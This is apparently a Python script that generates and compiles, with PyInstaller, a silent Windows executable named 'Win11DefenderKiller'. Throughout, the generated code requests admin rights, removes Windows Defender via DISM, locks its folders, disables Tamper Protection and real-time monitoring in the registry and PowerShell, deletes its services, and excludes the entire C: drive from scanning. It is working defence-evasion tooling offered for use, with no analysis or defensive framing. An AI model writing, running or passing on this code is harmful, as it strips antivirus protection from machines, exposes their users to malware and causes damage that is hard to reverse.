import os
import subprocess
import sys

def install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_win11_defender_disable():
    win11_code = '''import os
import subprocess
import time
import ctypes
import sys

def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return False
    except:
        return False

if not run_as_admin():
    sys.exit()

time.sleep(2)

def disable_defender_completely():
    # 1. УДАЛЯЕМ ЗАЩИТНИКА Через DISM
    dism_commands = [
        'dism /online /disable-feature /featurename:Windows-Defender /Remove /NoRestart',
        'dism /online /disable-feature /featurename:Windows-Defender-GUI /NoRestart'
    ]
    
    # 2. БЛОКИРУЕМ ДОСТУП К ФАЙЛАМ ЗАЩИТНИКА
    block_commands = [
        'takeown /f "C:\\\\Program Files\\\\Windows Defender" /r /d y',
        'icacls "C:\\\\Program Files\\\\Windows Defender" /deny Everyone:F /t',
        'takeown /f "C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender" /r /d y', 
        'icacls "C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender" /deny Everyone:F /t'
    ]
    
    # 3. РЕЕСТР - ПОЛНОЕ ОТКЛЮЧЕНИЕ
    registry_commands = [
        # Полное отключение через политики
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0 /f',
        
        # Отключаем Tamper Protection
        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f',
        
        # УДАЛЯЕМ службы из реестра
        'reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend" /f',
        'reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WdNisSvc" /f',
        'reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SecurityHealthService" /f',
        'reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WdNisDrv" /f'
    ]
    
    # 4. СЛУЖБЫ - ОСТАНАВЛИВАЕМ И УДАЛЯЕМ
    service_commands = [
        'sc stop WinDefend',
        'sc delete WinDefend',
        'sc stop WdNisSvc', 
        'sc delete WdNisSvc',
        'sc stop SecurityHealthService',
        'sc delete SecurityHealthService'
    ]
    
    # Выполняем все команды
    for cmd in dism_commands:
        subprocess.run(cmd, shell=True, capture_output=True)
        time.sleep(1)
    
    for cmd in block_commands:
        subprocess.run(cmd, shell=True, capture_output=True)
        time.sleep(1)
    
    for cmd in registry_commands:
        subprocess.run(cmd, shell=True, capture_output=True)
        time.sleep(0.5)
    
    for cmd in service_commands:
        subprocess.run(cmd, shell=True, capture_output=True)
        time.sleep(0.5)
    
    # 5. PowerShell - ФИНАЛЬНОЕ ОТКЛЮЧЕНИЕ
    ps_commands = [
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true",
        "Set-MpPreference -DisableBlockAtFirstSeen $true",
        "Set-MpPreference -DisableIOAVProtection $true",
        "Remove-MpPreference -ExclusionPath",
        "Add-MpPreference -ExclusionPath 'C:\\\\'"
    ]
    
    for cmd in ps_commands:
        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
        time.sleep(0.5)

disable_defender_completely()
'''

    with open('win11_defender_kill.py', 'w', encoding='utf-8') as f:
        f.write(win11_code)

def compile_to_exe():
    os.system('pyinstaller --onefile --noconsole --name "Win11DefenderKiller" win11_defender_kill.py')
    print("EXE создан: Win11DefenderKiller.exe")

if __name__ == "__main__":
    install_pyinstaller()
    create_win11_defender_disable()
    compile_to_exe()
